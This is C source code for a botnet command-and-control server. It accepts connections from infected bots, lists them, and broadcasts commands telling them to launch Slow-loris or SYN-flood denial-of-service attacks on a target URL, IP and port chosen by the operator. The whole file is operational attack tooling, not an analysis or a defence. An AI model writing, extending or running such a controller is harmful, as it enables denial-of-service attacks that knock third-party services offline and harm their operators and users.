#include "conn_handler.h"

/* TODO: Make all the communications encrypted.
 * 
 */

CONNS cons;
pthread_t accept_thread;
int main_sock;
struct sockaddr_in serverAddr;
short port = 15551;

void start()
{
	char reply[5];
	const char main_options[] = 
	"\033[0;34mOptions:\n"
	"\t[1] DDos\n"
	"\t[2] List All the Bots\n"
	"Choose a # from the list: \033[0m";

	while(1){
		printf("%s", main_options);
		fgets(reply, 5, stdin);
		if (strncmp(reply, "1", 1) == 0){
			ddos();	
		}else if (strncmp(reply, "2", 1) == 0){
			ls_all_bots();
		}else if (strncmp(reply, "q", 1) == 0){
			printf("[+] Shutting down all services\n");
			close_all();
			break;
		}else{
			printf("\033[0;31m[-] Wrong Choice!\033[0m\n");
		}

	}

}

void init()
{
	main_sock = make_socket();
	bind_socket(&serverAddr);
	listen(main_sock, 8);
	pthread_create(&accept_thread, NULL, (void *) accept_handler, NULL);
	
}

void close_all()
{
	// Stop Receiving Connections by connecting to the other thread.
	pthread_kill(accept_thread, SIGINT);
	printf("[+] Accepting Closed\n");
	struct connections *connects = &cons;
	send_to_bots("[!SHUTDOWN!]");
	while(connects != NULL && connects->sock != 0){

		// here sould have a protocol that will close the connection for a bot and cause it to stop running. 
		close(connects->sock);
		printf("[i] Connection Closed From : %s\n", inet_ntoa(connects->client_conn.sin_addr));
		connects = connects->next;
	}
	close(main_sock);
	_exit(0);
}

void sig_handler(int signo)
{
  if (signo == SIGINT){
  	printf("[+] Stoping the current DDOS\n");
  	send_to_bots("[!DDOS!]");
  	signal(SIGINT, SIG_DFL); // returning control back to the computer's default.
  	start();
  }
}

int hostname_to_ip(char * hostname , char* ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
         
    if ( (he = gethostbyname( hostname ) ) == NULL) 
    {
        // get the host info
        perror("gethostbyname");
        return 1;
    }
 
    addr_list = (struct in_addr **) he->h_addr_list;

    for(i = 0; addr_list[i] != NULL; i++) 
    {
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
     
    return 1;
}

void ddos()
{
	signal(SIGINT, sig_handler);

	const char ddos_options[] =
		"\033[0;33mDDos Options:\n"
		"\t[1] Slow-loris\n"
		"\t[2] Syn-Flood\n"
		"\t[3] All Types\n"
		"Select a number from above # : \033[0m";

	char reply[5];
	char target_ip[30];
	char max_threads[4];
	char type[14];
	char to_send[64];
	char port[6];

	while(1){
		printf("%s", ddos_options);
		fgets(reply, 5, stdin);
		memset(to_send, '\x00', 64);

		if(strncmp(reply, "1", 1) == 0){
			printf("\033[1;36m[*] Selected DDos -> Slow-loris\n");
			strncpy(type, "SLOW-LORIS", 11);

			printf("\nTarget to DDos[URL form]: http://");
			fgets(target_ip, 30, stdin);
			target_ip[strlen(target_ip)-1] = '\x00';

			printf("Max Number of Threads: ");
			fgets(max_threads, 4, stdin);
			max_threads[strlen(max_threads)-1] = '\x00';

			printf("\n\033[1;32m[*] Starting all The bots\n[i] ENTER Ctrl+C to quit current DDOS\033[0m\n");
			
			sprintf(to_send, "%s http://%s %s", type, target_ip, max_threads);
			printf("Current Options:\n\t%s\n", to_send);
			send_to_bots(to_send);
			while(1){

			}

		}else if(strncmp(reply, "2", 1) == 0){
			printf("\033[1;36m[*] Selected DDos -> Syn-Flood\n");
			strncpy(type, "SYN-FLOOD", 12);

			printf("\nTarget to DDos[IP form]: ");
			fgets(target_ip, 20, stdin);
			target_ip[strlen(target_ip)-1] = '\x00';
			
			printf("Target Port: ");
			fgets(port, 6, stdin);
			port[strlen(port) - 1] = '\x00';

			printf("Max Number of Threads: ");
			fgets(max_threads, 4, stdin);
			max_threads[strlen(max_threads)-1] = '\x00';

			printf("\n\033[1;32m[*] Starting all The bots\n[i] ENTER Ctrl+C to quit current DDOS\033[0m\n");
			
			sprintf(to_send, "%s %s %s %s", type, target_ip, max_threads, port);
			printf("%s\n", to_send);
			send_to_bots(to_send);
			while(1){

			}
		}else if(strncmp(reply, "3", 1) == 0){
			char target_url[30];
			char SL_port[6];
			char all_to_send[80];

			printf("\033[1;36m[*] Selected DDos -> All available Types\n");
			strncpy(type, "*", 2);

			printf("\nTarget to DDos[URL form]: http://");
			fgets(target_url, 30, stdin);
			target_url[strlen(target_url)-1] = '\x00';
			
			printf("\nPress ENTER to automatically assign the IP\n");
			printf("\nTarget to DDos[IP form]: ");
			fgets(target_ip, 20, stdin);
			if(strncmp(target_ip, "\n", 1) == 0){
				// find the ip from the hostname here.
				hostname_to_ip(target_url, target_ip);
			}else{
				target_ip[strlen(target_ip)-1] = '\x00';
			}

			printf("Target Port SYN-FLOOD: ", SL_port);
			fgets(port, 6, stdin);
			port[strlen(port) - 1] = '\x00';

			printf("Max Number of Threads: ");
			fgets(max_threads, 4, stdin);
			max_threads[strlen(max_threads)-1] = '\x00';

			printf("\n\033[1;32m[*] Starting all The bots\n[i] ENTER Ctrl+C to quit current DDOS\033[0m\n");
			
			sprintf(all_to_send, "%s %s http://%s %s %s", type, target_ip, target_url, port, max_threads);
			printf("%s\n", all_to_send);
			send_to_bots(all_to_send);
			while(1){

			}

		}else if(strncmp(reply, "q", 1) == 0){
			printf("[+] Shutting down all services\n");
			close_all();
		}else{
			printf("\033[0;31m[-] Wrong Choice!\033[0m\n");
		}

	}

}

void ls_all_bots()
{
	struct connections *connects = &cons;
	int i = 0;
	printf("\n");
	while(connects != NULL && connects->sock != 0){

		char temp[8];
		printf("%d\n", connects->sock);
		if(write(connects->sock, "UP?", 3) == -1) {
			connects = connects->next;
			continue;
		}
		
		read(connects->sock, temp, 8);
		
		if(strncmp(temp, "?YES!", 5) == 0) {
			printf("# %d Connection From => %s\n", i, inet_ntoa(connects->client_conn.sin_addr));
			i++;
		}
		connects = connects->next;
	}
}


int main(int argc, char const *argv[])
{
	// Printing the Banner.
	srand(time(NULL));
	switch(rand()%5){
		case 0:
			printf("\033[0;31m");break;
		case 1:
			printf("\033[0;32m");break;
		case 2:
			printf("\033[0;34m");break;
		case 3:
			printf("\033[0;33m");break;
		case 4:
			printf("\033[0;35m");break;
	}
	printf(" ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄\n");
	printf("▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n");
	printf("▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ \n");
	printf("▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░▌          ▐░▌          \n");
	printf("▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ \n");
	printf("▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n");
	printf("▐░▌           ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀█░█▀▀      ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌\n");
	printf("▐░▌               ▐░▌     ▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌  ▐░▌     ▐░▌       ▐░▌     ▐░▌                    ▐░▌\n");
	printf("▐░█▄▄▄▄▄▄▄▄▄      ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ ▐░▌      ▐░▌  ▄▄▄▄█░█▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌\n");
	printf("▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n");
	printf(" ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ \n");
	printf("\033[0m\n");

	printf("\033[0;32m[+] Initalizing the BotNet\033[0m\n");
	init();

	start();

	//close(main_sock);

	return 0;
}